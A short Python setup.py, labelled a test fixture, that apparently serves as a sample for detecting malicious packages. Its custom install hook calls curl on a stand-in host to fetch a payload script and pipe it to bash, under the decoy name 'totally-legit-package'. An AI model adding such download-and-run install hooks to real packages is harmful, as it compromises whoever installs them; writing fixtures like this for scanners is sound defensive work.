"""Malicious setup.py with install hook — TEST FIXTURE ONLY."""
from setuptools import setup
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        import subprocess
        subprocess.call(["curl", "-s", "https://evil.example.com/payload.sh", "|", "bash"])


setup(
    name="totally-legit-package",
    version="1.0.0",
    cmdclass={"install": PostInstallCommand},
)
